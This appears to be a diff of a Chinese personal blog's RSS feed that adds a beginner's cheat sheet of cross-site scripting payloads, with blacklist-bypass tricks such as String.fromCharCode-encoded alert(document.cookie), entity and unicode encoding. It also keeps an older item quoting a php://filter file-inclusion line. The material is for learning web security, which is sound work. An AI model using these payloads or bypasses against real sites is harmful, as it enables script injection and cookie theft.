@@ -1,5 +1,31 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>徐卿年的个人博客</title><link>https://JiangHuYeYu001.github.io</link><description>江湖夜雨十年灯。</description><copyright>徐卿年的个人博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://JiangHuYeYu001.github.io</link></image><lastBuildDate>Mon, 24 Nov 2025 01:21:42 +0000</lastBuildDate><managingEditor>徐卿年的个人博客</managingEditor><ttl>60</ttl><webMaster>徐卿年的个人博客</webMaster><item><title>小白学网安之文件包含2</title><link>https://JiangHuYeYu001.github.io/post/xiao-bai-xue-wang-an-zhi-wen-jian-bao-han-2.html</link><description>文件包含有一句很经典的伪协议，用来把目标的流进行base64编码：
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>徐卿年的个人博客</title><link>https://JiangHuYeYu001.github.io</link><description>江湖夜雨十年灯。</description><copyright>徐卿年的个人博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://JiangHuYeYu001.github.io</link></image><lastBuildDate>Mon, 24 Nov 2025 01:23:11 +0000</lastBuildDate><managingEditor>徐卿年的个人博客</managingEditor><ttl>60</ttl><webMaster>徐卿年的个人博客</webMaster><item><title>小白学网安之经典xss语句</title><link>https://JiangHuYeYu001.github.io/post/xiao-bai-xue-wang-an-zhi-jing-dian-xss-yu-ju.html</link><description>```
+&lt;img src='x' onerror=alert(1)&gt;
+&lt;img src=1 onmouseover=alert('xss’)&gt;
+&lt;a href='javascript:alert(1)'&gt;baidu&lt;/a&gt;
+&lt;a href='javascript:aaa' onmouseover='alert(/xss/)'&gt;aa&lt;/a&gt;
+&lt;script&gt;alert('xss')&lt;/script&gt;
+&lt;script&gt;prompt('xss')&lt;/script&gt;
+&lt;input value='' onclick=alert('xss') type='text'&gt;
+&lt;input name='name' value='' onmouseover=prompt('xss') bad=''&gt;
+&lt;iframe src='javascript:alert('xss')'&gt;&lt;iframe&gt;
+&lt;iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4='&gt;
+&lt;iframe src='aaa' onmouseover=alert('xss') /&gt;&lt;iframe&gt;
+&lt;iframe src='javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;'&gt;&lt;/iframe&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;input name='name' value='' onmouseover=prompt('xss') bad=“”&gt;
+&lt;input type=“hidden” accesskey=“X” onclick=“alert(1)”&gt;
+eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))  
+适用于绕过黑名单alert 在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，
+因为大多数的过滤系统都不会把String.fromCharCode加以过滤，例如关键字alert被过滤掉，那就可以这么利用alert(document.cookie)
+&lt;img src='1' onerror=alert(1)&gt;
+&lt;img src='1' onerror=alert&amp;#40;1&amp;#41;&gt;（实体化()
+&lt;img src=1 onerror=alert&amp;#40&amp;#41&gt;
+ &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;
+&lt;img src='1' onerror=location='javascript:alert(1)”&gt;
+&lt;img src='1' onerror=location='javascript:alert%281%29”&gt;
+```
+。</description><guid isPermaLink="true">https://JiangHuYeYu001.github.io/post/xiao-bai-xue-wang-an-zhi-jing-dian-xss-yu-ju.html</guid><pubDate>Mon, 24 Nov 2025 01:22:41 +0000</pubDate></item><item><title>小白学网安之文件包含2</title><link>https://JiangHuYeYu001.github.io/post/xiao-bai-xue-wang-an-zhi-wen-jian-bao-han-2.html</link><description>文件包含有一句很经典的伪协议，用来把目标的流进行base64编码：
 ```
 php;//filter/convert.base64-encode/resource=flag.php
 ```
